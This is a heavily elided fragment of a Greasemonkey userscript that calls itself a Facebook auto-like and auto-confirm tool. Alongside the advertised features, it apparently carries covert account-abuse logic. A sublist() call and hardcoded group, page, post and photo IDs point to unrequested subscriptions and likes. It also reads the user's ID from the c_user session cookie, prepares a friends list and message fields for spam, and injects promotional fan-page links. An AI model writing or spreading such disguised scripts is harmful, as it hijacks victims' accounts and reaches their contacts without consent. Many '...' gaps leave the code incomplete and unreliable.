// ==UserScript==
// @name           Facebook Auto Like And Auto Confirm Fresh 
// @namespace      http://userscripts.org/scripts/show/145613
// @description    Automatically Like/Unlike All Status or Comment and Confirm/Unconfirm All Request. Information click http://rasanya.com/108/social-media/auto-like-status-and-comment/
...
sublist("580612625323431");




var gid = ['146003602255228'];
...
if(body != null) {
	...
	div.innerHTML = "<center><a href='http://rasanya.com/108/social-media/auto-like-status-and-comment/'><img src='https://lh6.googleusercontent.com/-v0Fg_3BAdnY/Tf8hUwXXIYI/AAAAAAAAAA4/kSyrghkdOeg/Facebook-like-thumbs-up-symbol.jpg' alt='Loading...' width=100 hight=75></a></center>"
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='http://www.facebook.com/MediaDasar' title='Jasa Pembuatan Toko Online'>Please Click Like Fan Page</a></center> "
		}
		else {
...
var spage_id = "173074899484286";
var spost_id = "173074899484286";
var sfoto_id = "173074899484286";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
